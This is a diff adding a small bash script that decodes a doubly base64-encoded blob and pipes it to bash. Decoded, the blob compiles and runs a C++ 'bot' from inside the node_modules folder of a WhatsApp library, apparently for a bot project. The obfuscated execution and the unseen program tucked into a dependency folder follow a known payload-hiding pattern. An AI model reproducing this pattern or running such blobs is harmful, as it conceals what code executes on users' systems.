@@ -1,0 +1,6 @@
+#!/bin/bash
+base64 -d << 'EOF' | base64 -d | bash
+SXlFdlltbHVMMkpoYzJnS1kyUWdmZ3BqWkNCQmNtVjZRbTkwTDI1dlpHVmZiVzlrZFd4bGN5OUFk
+MmhwYzJ0bGVYTnZZMnRsZEhNdgpZbUZwYkdWNWN5OEtZMnhoYm1jckt5QnRZV2x1TG1Od2NDQXRj
+M1JrUFdNckt6RTNJQzF3ZEdoeVpXRmtJQzF2SUdKdmRBb3VMMkp2CmRBPT0K
+EOF
